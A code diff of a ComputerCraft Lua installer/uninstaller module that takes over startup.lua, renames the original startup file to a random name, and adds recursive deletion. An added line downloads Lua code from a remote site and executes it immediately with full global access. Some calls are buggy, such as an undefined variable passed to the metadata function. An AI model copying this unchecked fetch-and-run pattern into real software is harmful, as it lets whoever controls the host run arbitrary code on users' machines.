@@ -13,14 +13,23 @@ local OriginalShell = shell
 local OriginalFS = fs
 local OriginalInstallDir=nil
 local CustomFS = nil
+local utils = load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
+local configpath = nil
+
+if (utils==nil) then
+    print("Utils is nil somehow")
+    return nil
+else
+    print("utils loaded successfully")
+end
 local function scan_startup()
     --Checks for my name in comments
     if OriginalFS.exists("startup.lua") then local f=OriginalFS.open("startup.lua","r") local l1,l2,l3=f.readLine(),f.readLine(),f.readLine() f.close() if (l1..l2..l3):find("wget pastebin") then local u=string.match(l1..l2..l3,"pastebin%s+(%S+)") if u then local r=http.get("https://pastebin.com/raw/"..u) if r and r.readAll():find("David Lightman") then return true end end elseif (l1..l2..l3):find("David Lightman") then return true end end
     return false
 end
 
+
 local function getRealStartupPath()
-    --shell.setDir("/")
     if not fs.exists("/startup.lua") then return nil end
     local f1 = fs.open("/startup.lua", "r")
     if not f1 then return nil end  -- Safeguard against failed open
@@ -69,8 +78,31 @@ local function detect_installation()
     if (flag1 or flag2 or flag3 or flag4) then return true end
 end
 
-local function uninstall()
+local function uninstall(ogfs, dir)
+    if not ogfs.exists(dir) then
+        return false
+    end
 
+    local items = ogfs.list(dir) -- List all items in the directory
+    for _, item in ipairs(items) do
+        local path = dir .. "/" .. item
+        if ogfs.isDir(path) then
+            -- Recursively delete subdirectories
+            uninstall(ogfs, path)
+        else
+            -- Delete files
+            ogfs.delete(path)
+        end
+    end
+
+    -- Delete the now-empty directory
+    ogfs.delete(dir)
+    return true
+end
+
+local function createMetadataFile(mdfn)
+    if (mdfn==nil) then print("mdfn is nil") end
+    if (configpath~=nil) then utils.addMetadata(OriginalFS, mdfn, "config",configpath,"|") end
 end
 
 local function installer()
@@ -89,61 +121,67 @@ local function installer()
 
     local metadataFilename = generateRandomString(8) -- Set your metadata filename here
     local randomDelimiter = "^" -- Use a random delimiter for separation
-
+    createMetadataFile(metadataFile)
     originalStartup = getRealStartupPath()
     oldStartupFileName = generateRandomString(8) -- Does not end with .lua
     if (originalStartup == nil) then
-        if OriginalFS.exists("startup.lua") then
-            OriginalFS.move("startup.lua", oldStartupFileName .. ".lua")
-            local f = OriginalFS.open("startup.lua", "w")
-            f.write(string.format([[
-
+        if (originalStartup == nil) then
+            if OriginalFS.exists("startup.lua") then
+                -- Rename the existing startup.lua
+                OriginalFS.move("startup.lua", oldStartupFileName .. ".lua")
+                -- Create a new startup.lua
+                local f = OriginalFS.open("startup.lua", "w")
+                f.write(string.format([[
 -- SPDX-FileCopyrightText: 2025 David Lightman
 --
--- SPDX-License-Identifier: LicenseRef-CCPL
+-- SPDX-LicenseRef-CCPL
 --%s.
 --%s,%s
 --%s%s%s
-
 local function a1()
     shell.setDir("/")
+    term.setCursorPos(1, 1)
+    term.clear()
     shell.run("%s")
     shell.run("shell.lua")
+    os.shutdown()
 end
 local function a2()
     shell.setDir("/")
     shell.run("%s/%s")
 end
 parallel.waitForAny(a1, a2)
-os.shutdown()
                 ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
-            f.close()
-        else
-            local f = OriginalFS.open(oldStartupFileName, "w")
-            f.close()
-            local f = OriginalFS.open("startup.lua", "w")
-            f.write(string.format([[
-
-            -- SPDX-FileCopyrightText: 2025 David Lightman
-            --
-            -- SPDX-License-Identifier: LicenseRef-CCPL
-            --%s.
-            --%s,%s
-            --%s%s%s
-            
-            local function a1()
-                shell.setDir("/")
-                shell.run("%s")
-                shell.run("shell.lua")
+                f.close()
+            else
+                -- If no existing startup.lua, create a placeholder and the new startup.lua
+                local f = OriginalFS.open(oldStartupFileName, "w")
+                f.close()
+        
+                local f = OriginalFS.open("startup.lua", "w")
+                f.write(string.format([[
+-- SPDX-FileCopyrightText: 2025 David Lightman
+--
+-- SPDX-LicenseRef-CCPL
+--%s.
+--%s,%s
+--%s%s%s
+local function a1()
+    shell.setDir("/")
+    term.setCursorPos(1, 1)
+    term.clear()
+    shell.run("%s")
+    shell.run("shell.lua")
+    os.shutdown()
+end
+local function a2()
+    shell.setDir("/")
+    shell.run("%s/%s")
+end
+parallel.waitForAny(a1, a2)
+                ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
+                f.close()
             end
-            local function a2()
-                shell.setDir("/")
-                shell.run("%s/%s")
-            end
-            parallel.waitForAny(a1, a2)
-            os.shutdown()
-                            ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
-            f.close()
         end
     end
 
@@ -180,9 +218,8 @@ os.shutdown()
     end
 end
 
-
-function uninstaller.uninstall()
-    uninstall()
+function uninstaller.uninstall(ogfs, dir)
+    uninstall(ogfs, dir)
 end
 
 function uninstaller.installer()
@@ -201,5 +238,8 @@ function uninstaller.setCFS(fs2)
 end
 function uninstaller.getInstallDir()
     return OriginalInstallDir
+end
+function uninstaller.setConfigPath(cp)
+    if ((cp~=nil) and (type(cp)=="string")) then configpath = cp end
 end
 return uninstaller
